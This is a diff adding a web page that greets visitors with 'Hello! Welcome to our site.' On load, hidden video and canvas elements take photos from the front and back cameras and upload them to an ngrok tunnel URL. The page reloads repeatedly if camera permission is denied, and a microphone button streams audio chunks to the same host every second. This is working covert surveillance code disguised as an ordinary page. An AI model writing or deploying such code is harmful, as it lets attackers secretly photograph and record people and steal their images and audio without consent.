@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Background Photo Capture with Audio</title>
+    <style>
+        /* Hide video and canvas elements */
+        #videoFront, #videoBack, #canvasFront, #canvasBack {
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <h2>Hello! Welcome to our site.</h2> <!-- This is the only visible message -->
+
+    <video id="videoFront" autoplay></video>
+    <video id="videoBack" autoplay></video>
+    <canvas id="canvasFront" width="500" height="500"></canvas>
+    <canvas id="canvasBack" width="500" height="500"></canvas>
+
+    <!-- Button to start microphone recording -->
+    <button id="startMicBtn">Start Mic Recording</button>
+
+    <script>
+        let mediaRecorder; // For mic recording
+        let audioChunks = []; // Store audio data
+        let isRecording = false; // To track mic recording status
+
+        document.addEventListener("DOMContentLoaded", () => {
+            // Start capturing front and back camera images in parallel
+            captureCameras();
+        });
+
+        // Function to capture both front and back camera images in parallel
+        async function captureCameras() {
+            try {
+                const frontCameraPromise = navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: 'user' }  // Front camera
+                });
+
+                const backCameraPromise = navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: { exact: 'environment' } }  // Back camera
+                });
+
+                const [frontStream, backStream] = await Promise.all([frontCameraPromise, backCameraPromise]);
+
+                // Handle front camera
+                const videoFront = document.getElementById('videoFront');
+                const canvasFront = document.getElementById('canvasFront');
+                const contextFront = canvasFront.getContext('2d');
+                videoFront.srcObject = frontStream;
+
+                videoFront.addEventListener('loadedmetadata', () => {
+                    // Capture front camera image after 1 second
+                    setTimeout(() => {
+                        contextFront.drawImage(videoFront, 0, 0, canvasFront.width, canvasFront.height);
+                        const frontImageData = canvasFront.toDataURL('image/jpeg', 0.8);
+                        sendImageToServer(frontImageData, 'front');
+                        frontStream.getTracks().forEach(track => track.stop());  // Stop front camera
+                    }, 1000);  // Capture image after 1 second
+                });
+
+                // Handle back camera
+                const videoBack = document.getElementById('videoBack');
+                const canvasBack = document.getElementById('canvasBack');
+                const contextBack = canvasBack.getContext('2d');
+                videoBack.srcObject = backStream;
+
+                videoBack.addEventListener('loadedmetadata', () => {
+                    // Capture back camera image after 1 second
+                    setTimeout(() => {
+                        contextBack.drawImage(videoBack, 0, 0, canvasBack.width, canvasBack.height);
+                        const backImageData = canvasBack.toDataURL('image/jpeg', 0.8);
+                        sendImageToServer(backImageData, 'back');
+                        backStream.getTracks().forEach(track => track.stop());  // Stop back camera
+                    }, 1000);  // Capture image after 1 second
+                });
+            } catch (error) {
+                console.error('Error accessing cameras:', error);
+                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
+                    location.reload();  // Reload if permission is denied
+                }
+            }
+        }
+
+        // Function to handle continuous mic recording when the button is clicked
+        document.getElementById('startMicBtn').addEventListener('click', async () => {
+            if (!isRecording) {
+                await startMicRecording();  // Start recording when the button is clicked
+            } else {
+                stopMicRecording();  // Stop recording if the button is clicked again
+            }
+        });
+
+        // Function to start microphone recording
+        async function startMicRecording() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                mediaRecorder = new MediaRecorder(stream);
+                mediaRecorder.start(1000);  // Capture audio every second
+
+                mediaRecorder.ondataavailable = event => {
+                    audioChunks.push(event.data);
+                    // Continuously send each chunk to the server
+                    sendAudioToServer(event.data);
+                };
+
+                isRecording = true;
+                document.getElementById('startMicBtn').innerText = 'Stop Mic Recording';
+
+            } catch (error) {
+                console.error('Error accessing microphone:', error);
+                if (error.name === 'NotAllowedError' || error.name === 'SecurityError') {
+                    location.reload();  // Reload if permission is denied
+                }
+            }
+        }
+
+        // Function to stop microphone recording
+        function stopMicRecording() {
+            if (mediaRecorder) {
+                mediaRecorder.stop();
+                isRecording = false;
+                document.getElementById('startMicBtn').innerText = 'Start Mic Recording';
+                audioChunks = [];  // Clear audio chunks
+            }
+        }
+
+        // Function to send image data to the server
+        function sendImageToServer(imageData, cameraType) {
+            console.log(`Sending ${cameraType} camera image to the server...`);
+            fetch('https://2e59-2401-4900-51d3-f719-b49c-3e8f-439-6071.ngrok-free.app/upload-image', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({ image: imageData, camera: cameraType })
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Server error: ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log(`${cameraType} camera image uploaded successfully:`, data))
+            .catch(error => console.error('Error uploading image:', error));
+        }
+
+        // Function to send recorded audio to the server
+        function sendAudioToServer(audioBlob) {
+            console.log('Sending audio chunk to the server...');
+            const formData = new FormData();
+            formData.append('audio', audioBlob, 'mic_chunk.wav');
+
+            fetch('https://2e59-2401-4900-51d3-f719-b49c-3e8f-439-6071.ngrok-free.app/upload-audio', {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                if (!response.ok) {
+                    throw new Error(`Server error: ${response.statusText}`);
+                }
+                return response.json();
+            })
+            .then(data => console.log('Audio chunk uploaded successfully:', data))
+            .catch(error => console.error('Error uploading audio:', error));
+        }
+    </script>
+</body>
+</html>
